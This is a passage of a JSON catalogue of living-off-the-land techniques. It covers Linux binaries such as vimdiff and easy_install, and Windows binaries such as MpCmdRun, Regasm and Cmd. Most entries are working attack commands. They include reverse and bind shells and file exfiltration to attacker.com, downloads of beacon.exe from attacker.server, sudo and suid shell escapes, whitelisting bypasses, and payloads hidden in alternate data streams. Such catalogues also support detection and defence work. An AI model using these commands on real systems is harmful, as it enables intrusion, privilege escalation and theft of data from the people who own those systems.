`vimdiff` is compiled with Lua support.", "code": "vimdiff -c ':lua os.execute(\"reset; exec sh\")'"}]}, "929": {"platform": "linux", "cmd": "vimdiff", "function": "reverse-shell", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}]}, "930": {"platform": "linux", "cmd": "vimdiff", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "931": {"platform": "linux", "cmd": "vimdiff", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "932": {"platform": "linux", "cmd": "vimdiff", "function": "file-upload", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "933": {"platform": "linux", "cmd": "vimdiff", "function": "file-download", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "934": {"platform": "linux", "cmd": "vimdiff", "function": "file-write", "data": [{"code": "vimdiff file_to_write\niDATA\n^[\nw\n"}]}, "935": {"platform": "linux", "cmd": "vimdiff", "function": "file-read", "data": [{"code": "vimdiff file_to_read"}]}, "936": {"platform": "linux", "cmd": "vimdiff", "function": "library-load", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}]}, "937": {"platform": "linux", "cmd": "vimdiff", "function": "suid", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}]}, "938": {"platform": "linux", "cmd": "vimdiff", "function": "sudo", "data": [{"code": "sudo vimdiff -c ':!/bin/sh'"}, {"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `vimdiff` is compiled with Lua support.", "code": "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"}]}, "939": {"platform": "linux", "cmd": "vimdiff", "function": "capabilities", "data": [{"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}]}, "940": {"platform": "linux", "cmd": "vimdiff", "function": "limited-suid", "data": [{"description": "This requires that `vimdiff` is compiled with Lua support.", "code": "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"}]}, "941": {"platform": "linux", "cmd": "iconv", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\"\n"}]}, "942": {"platform": "linux", "cmd": "iconv", "function": "file-read", "data": [{"code": "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}]}, "943": {"platform": "linux", "cmd": "iconv", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}]}, "944": {"platform": "linux", "cmd": "iconv", "function": "sudo", "data": [{"code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}]}, "945": {"platform": "linux", "cmd": "xz", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d\n"}]}, "946": {"platform": "linux", "cmd": "xz", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"}]}, "947": {"platform": "linux", "cmd": "xz", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"}]}, "948": {"platform": "linux", "cmd": "easy_install", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n"}]}, "949": {"platform": "linux", "cmd": "easy_install", "function": "reverse-shell", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n"}]}, "950": {"platform": "linux", "cmd": "easy_install", "function": "file-upload", "data": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n"}]}, "951": {"platform": "linux", "cmd": "easy_install", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request. The file path must be absolute.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n"}]}, "952": {"platform": "linux", "cmd": "easy_install", "function": "file-write", "data": [{"description": "The file path must be absolute.", "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n"}]}, "953": {"platform": "linux", "cmd": "easy_install", "function": "file-read", "data": [{"description": "The read file content is wrapped within program messages.", "code": "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n"}]}, "954": {"platform": "linux", "cmd": "easy_install", "function": "library-load", "data": [{"code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n"}]}, "955": {"platform": "linux", "cmd": "easy_install", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"}]}, "956": {"platform": "linux", "cmd": "openvt", "function": "sudo", "data": [{"description": "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.", "code": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"}]}, "957": {"platform": "windows", "cmd": "Explorer.exe", "cmd_alias": "Explorer", "cmd_desc": "Binary used for managing files and system components within Windows", "function": "execute", "data": [{"Command": "explorer.exe /root,\"C:\\Windows\\System32\\calc.exe\"", "Description": "Execute calc.exe with the parent process spawning from a new instance of explorer.exe", "Usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows XP, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "explorer.exe C:\\Windows\\System32\\notepad.exe", "Description": "Execute calc.exe with the parent process spawning from a new instance of explorer.exe", "Usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 (Tested)"}]}, "958": {"platform": "windows", "cmd": "Runonce.exe", "cmd_alias": "Runonce", "cmd_desc": null, "function": "execute", "data": [{"Command": "Runonce.exe /AlternateShellStartup", "Description": "Executes a Run Once Task that has been configured in the registry", "Usecase": "Persistence, bypassing defensive counter measures", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "959": {"platform": "windows", "cmd": "Pcalua.exe", "cmd_alias": "Pcalua", "cmd_desc": "Program Compatibility Assistant", "function": "execute", "data": [{"Command": "pcalua.exe -a calc.exe", "Description": "Open the target .EXE using the Program Compatibility Assistant.", "Usecase": "Proxy execution of binary", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "pcalua.exe -a \\\\server\\payload.dll", "Description": "Open the target .DLL file with the Program Compatibilty Assistant.", "Usecase": "Proxy execution of remote dll file", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "pcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java", "Description": "Open the target .CPL file with the Program Compatibility Assistant.", "Usecase": "Execution of CPL files", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "960": {"platform": "windows", "cmd": "Hh.exe", "cmd_alias": "Hh", "cmd_desc": "Binary used for processing chm files in Windows", "function": "download", "data": [{"Command": "HH.exe http://some.url/script.ps1", "Description": "Open the target PowerShell script with HTML Help.", "Usecase": "Download files from url", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "961": {"platform": "windows", "cmd": "Hh.exe", "cmd_alias": "Hh", "cmd_desc": "Binary used for processing chm files in Windows", "function": "execute", "data": [{"Command": "HH.exe c:\\windows\\system32\\calc.exe", "Description": "Executes calc.exe with HTML Help.", "Usecase": "Execute process with HH.exe", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "962": {"platform": "windows", "cmd": "Sc.exe", "cmd_alias": "Sc", "cmd_desc": "Used by Windows to manage services", "function": "ads", "data": [{"Command": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "Description": "Creates a new service and executes the file stored in the ADS.", "Usecase": "Execute binary file hidden inside an alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "963": {"platform": "windows", "cmd": "GfxDownloadWrapper.exe", "cmd_alias": "GfxDownloadWrapper", "cmd_desc": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.", "function": "download", "data": [{"Command": "C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"", "Description": "GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by \"Microsoft Windows Hardware\", \"Compatibility Publisher\", \"Microsoft Windows Third Party Component CA 2012\", \"Microsoft Time-Stamp PCA 2010\", \"Microsoft Time-Stamp Service\".", "Usecase": "Download file from internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/techniques/T1105/", "OperatingSystem": "Windows 10"}]}, "964": {"platform": "windows", "cmd": "Cscript.exe", "cmd_alias": "Cscript", "cmd_desc": "Binary used to execute scripts in Windows", "function": "ads", "data": [{"Command": "cscript c:\\ads\\file.txt:script.vbs", "Description": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).", "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "965": {"platform": "windows", "cmd": "Ttdinject.exe", "cmd_alias": "Ttdinject", "cmd_desc": "Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)", "function": "execute", "data": [{"Command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"C:/Windows/System32/calc.exe\"", "Description": "Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.", "Usecase": "Spawn process using other binary", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 2004"}, {"Command": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"C:/Windows/System32/calc.exe\"", "Description": "Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.", "Usecase": "Spawn process using other binary", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 1909"}]}, "966": {"platform": "windows", "cmd": "Rasautou.exe", "cmd_alias": "Rasautou", "cmd_desc": "Windows Remote Access Dialer", "function": "execute", "data": [{"Command": "rasautou -d powershell.dll -p powershell -a a -e e", "Description": "Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.", "Usecase": "Execute DLL code", "Category": "Execute", "Privileges": "User, Administrator in Windows 8", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1"}]}, "967": {"platform": "windows", "cmd": "Xwizard.exe", "cmd_alias": "Xwizard", "cmd_desc": null, "function": "execute", "data": [{"Command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "Description": "Xwizard.exe running a custom class that has been added to the registry.", "Usecase": "Run a com object created in registry to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "Description": "Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.", "Usecase": "Run a com object created in registry to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "968": {"platform": "windows", "cmd": "Xwizard.exe", "cmd_alias": "Xwizard", "cmd_desc": null, "function": "download", "data": [{"Command": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM", "Description": "Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows 10"}]}, "969": {"platform": "windows", "cmd": "Makecab.exe", "cmd_alias": "Makecab", "cmd_desc": "Binary to package existing files into a cabinet (.cab) file", "function": "ads", "data": [{"Command": "makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab", "Description": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.", "Usecase": "Hide data compressed into an alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab", "Description": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.", "Usecase": "Hide data compressed into an alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "970": {"platform": "windows", "cmd": "Makecab.exe", "cmd_alias": "Makecab", "cmd_desc": "Binary to package existing files into a cabinet (.cab) file", "function": "download", "data": [{"Command": "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab", "Description": "Download and compresses the target file and stores it in the target file.", "Usecase": "Download file and compress into a cab file", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "971": {"platform": "windows", "cmd": "Runscripthelper.exe", "cmd_alias": "Runscripthelper", "cmd_desc": null, "function": "execute", "data": [{"Command": "runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test", "Description": "Execute the PowerShell script named test.txt", "Usecase": "Bypass constrained language mode and execute Powershell script", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "972": {"platform": "windows", "cmd": "Regasm.exe", "cmd_alias": "Regasm", "cmd_desc": "Part of .NET", "function": "awl-bypass", "data": [{"Command": "regasm.exe AllTheThingsx64.dll", "Description": "Loads the target .DLL file and executes the RegisterClass function.", "Usecase": "Execute code and bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "Local Admin", "MitreID": "T1121", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "973": {"platform": "windows", "cmd": "Regasm.exe", "cmd_alias": "Regasm", "cmd_desc": "Part of .NET", "function": "execute", "data": [{"Command": "regasm.exe /U AllTheThingsx64.dll", "Description": "Loads the target .DLL file and executes the UnRegisterClass function.", "Usecase": "Execute code and bypass Application whitelisting", "Category": "Execute", "Privileges": "User", "MitreID": "T1121", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "974": {"platform": "windows", "cmd": "Diskshadow.exe", "cmd_alias": "Diskshadow", "cmd_desc": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).", "function": "dump", "data": [{"Command": "diskshadow.exe /s c:\\test\\diskshadow.txt", "Description": "Execute commands using diskshadow.exe from a prepared diskshadow script.", "Usecase": "Use diskshadow to exfiltrate data from VSS such as NTDS.dit", "Category": "Dump", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows server"}]}, "975": {"platform": "windows", "cmd": "Diskshadow.exe", "cmd_alias": "Diskshadow", "cmd_desc": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).", "function": "execute", "data": [{"Command": "diskshadow> exec calc.exe", "Description": "Execute commands using diskshadow.exe to spawn child process", "Usecase": "Use diskshadow to bypass defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows server"}]}, "976": {"platform": "windows", "cmd": "Ie4uinit.exe", "cmd_alias": "Ie4uinit", "cmd_desc": null, "function": "execute", "data": [{"Command": "ie4uinit.exe -BaseSettings", "Description": "Executes commands from a specially prepared ie4uinit.inf file.", "Usecase": "Get code execution by copy files to another location", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "977": {"platform": "windows", "cmd": "Cmd.exe", "cmd_alias": "Cmd", "cmd_desc": "The command-line interpreter in Windows", "function": "ads", "data": [{"Command": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat", "Description": "Add content to an Alternate Data Stream (ADS).", "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "Category": "ADS", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "cmd.exe - < fakefile.doc:payload.bat", "Description": "Execute payload.bat stored in an Alternate Data Stream (ADS).", "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "Category": "ADS", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "978": {"platform": "windows", "cmd": "Netsh.exe", "cmd_alias": "Netsh", "cmd_desc": "Netsh is a Windows tool used to manipulate network interface settings.", "function": "execute", "data": [{"Command": "netsh.exe add helper C:\\Users\\User\\file.dll", "Description": "Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called", "Usecase": "Proxy execution of .dll", "Category": "Execute", "Privileges": "User", "MitreID": "T1128", "MitreLink": "https://attack.mitre.org/techniques/T1128/", "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "979": {"platform": "windows", "cmd": "MpCmdRun.exe", "cmd_alias": "MpCmdRun", "cmd_desc": "Binary part of Windows Defender. Used to manage settings in Windows Defender", "function": "download", "data": [{"Command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe", "Description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)", "Usecase": "Download file", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows 10"}, {"Command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url https://attacker.server/beacon.exe -path C:\\Users\\Public\\Downloads\\evil.exe", "Description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]", "Usecase": "Download file", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows 10"}]}, "980": {"platform": "windows", "cmd": "MpCmdRun.exe", "cmd_alias": "MpCmdRun", "cmd_desc": "Binary part of Windows Defender. Used to manage settings in Windows Defender", "function": "ads", "data": [{"Command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe", "Description": "Download file to machine and store it in Alternate Data Stream", "Usecase": "Hide downloaded data inton an Alternate Data Stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows 10"}]}, "981": {"platform": "windows", "cmd": "Psr.exe", "cmd_alias": "Psr", "cmd_desc": "Windows Problem Steps Recorder, used to record screen and clicks.", "function": "reconnaissance", "data": [{"Command": "psr.exe /start /output D:\\test.zip /sc 1 /gui 0", "Description": "Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file.", "Usecase": "Can be used to take screenshots of the user environment", "Category": "Reconnaissance", "Privileges": "User", "MitreID": "T1113", "MitreLink": "https://attack.mitre.org/techniques/T1113/", "OperatingSystem": "since Windows 7 (client) / Windows 2008 R2"}]}, "982": {"platform": "windows", "cmd": "Reg.exe", "cmd_alias": "Reg", "cmd_desc": "Used to manipulate the registry", "function": "ads", "data": [{"Command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg", "Description": "Export the target Registry key and save it to the specified .REG file within an Alternate data stream.", "Usecase": "Hide/plant registry information in Alternate data stream for later use", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "983": {"platform": "windows", "cmd": "Msconfig.exe", "cmd_alias": "Msconfig", "cmd_desc": "MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows", "function": "execute", "data": [{"Command": "Msconfig.exe -5", "Description": "Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml.", "Usecase": "Code execution using 